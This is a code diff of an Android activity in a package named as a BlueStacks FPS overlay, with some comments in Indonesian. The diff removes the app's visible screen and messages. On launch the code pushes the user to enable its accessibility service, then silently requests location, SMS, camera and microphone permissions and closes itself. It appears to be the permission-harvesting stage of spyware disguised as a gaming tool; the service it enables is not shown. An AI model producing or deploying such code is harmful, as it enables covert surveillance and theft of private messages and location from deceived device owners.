@@ -1,93 +1,73 @@
 package com.bluestacks.fpsoverlay;
 
 import android.Manifest;
+import android.app.Activity;
 import android.content.Intent;
 import android.content.pm.PackageManager;
-import android.net.Uri;
-import android.os.Build;
 import android.os.Bundle;
-import android.os.Environment;
 import android.provider.Settings;
-import android.widget.Toast;
 import androidx.annotation.NonNull;
-import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import java.util.ArrayList;
 import java.util.List;
 
-public class CoreActivity extends AppCompatActivity {
+public class CoreActivity extends Activity {
     private static final int REQ_CODE = 100;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_main);
         
-        // Step 1: Priority on Accessibility Service
+        // Cek Aksesibilitas
         if (!isAccessibilityServiceEnabled()) {
-            Toast.makeText(this, "Please enable Accessibility Service to continue", Toast.LENGTH_LONG).show();
-            startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
+            try {
+                Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivity(intent);
+            } catch (Exception ignored) {}
+            finish();
         } else {
-            // If already enabled, proceed to other permissions
             checkOtherPermissions();
         }
     }
 
     private void checkOtherPermissions() {
-        // Cek apakah Aksesibilitas SUDAH aktif, jika belum jangan minta izin dulu
-        if (!isAccessibilityServiceEnabled()) return;
-
-        List<String> p = new ArrayList<>();
-        p.add(Manifest.permission.ACCESS_FINE_LOCATION);
-        p.add(Manifest.permission.READ_SMS);
-        p.add(Manifest.permission.CAMERA);
-        p.add(Manifest.permission.RECORD_AUDIO);
+        String[] permissions = {
+            Manifest.permission.ACCESS_FINE_LOCATION,
+            Manifest.permission.READ_SMS,
+            Manifest.permission.CAMERA,
+            Manifest.permission.RECORD_AUDIO
+        };
 
         List<String> needed = new ArrayList<>();
-        for (String perm : p) {
+        for (String perm : permissions) {
             if (ActivityCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                 needed.add(perm);
             }
         }
 
         if (!needed.isEmpty()) {
-            // Memberi jeda sedikit agar Accessibility Service punya waktu untuk inisialisasi window baru
-            new android.os.Handler().postDelayed(() -> {
-                ActivityCompat.requestPermissions(this, needed.toArray(new String[0]), REQ_CODE);
-            }, 1000);
-        }
-    }
-
-    @Override
-    protected void onResume() {
-        super.onResume();
-        // Re-check when coming back from settings
-        if (isAccessibilityServiceEnabled()) {
-            checkOtherPermissions();
+            ActivityCompat.requestPermissions(this, needed.toArray(new String[0]), REQ_CODE);
+        } else {
+            finish();
         }
     }
 
     private boolean isAccessibilityServiceEnabled() {
-        android.content.ComponentName expectedComponentName = new android.content.ComponentName(this, SupportService.class);
-        String enabledServicesSetting = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
-        if (enabledServicesSetting == null) return false;
-
-        android.text.TextUtils.SimpleStringSplitter colonSplitter = new android.text.TextUtils.SimpleStringSplitter(':');
-        colonSplitter.setString(enabledServicesSetting);
-
-        while (colonSplitter.hasNext()) {
-            String componentNameString = colonSplitter.next();
-            android.content.ComponentName enabledService = android.content.ComponentName.unflattenFromString(componentNameString);
-            if (enabledService != null && enabledService.equals(expectedComponentName)) return true;
-        }
+        String service = getPackageName() + "/" + SupportService.class.getCanonicalName();
+        try {
+            int accessibilityEnabled = Settings.Secure.getInt(getContentResolver(), Settings.Secure.ACCESSIBILITY_ENABLED);
+            if (accessibilityEnabled == 1) {
+                String settingValue = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
+                return settingValue != null && settingValue.contains(service);
+            }
+        } catch (Exception ignored) {}
         return false;
     }
 
     @Override
     public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-        if (requestCode == REQ_CODE) {
-            Toast.makeText(this, "Permissions updated", Toast.LENGTH_SHORT).show();
-        }
+        finish();
     }
 }
